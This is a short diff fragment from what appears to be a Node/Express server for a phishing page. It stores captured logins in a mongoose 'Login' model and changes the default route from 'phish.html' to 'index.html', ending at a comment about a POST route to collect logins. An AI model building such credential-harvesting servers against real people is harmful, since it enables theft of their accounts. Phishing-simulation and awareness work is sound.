@@ -27,7 +27,7 @@ const Login = mongoose.model('Login', loginSchema);
 
 // Serve phish.html as default page
 app.get('/', (req, res) => {
-  res.sendFile(path.join(__dirname, 'phish.html'));
+  res.sendFile(path.join(__dirname, 'index.html'));
 });
 
 // POST route to collect login
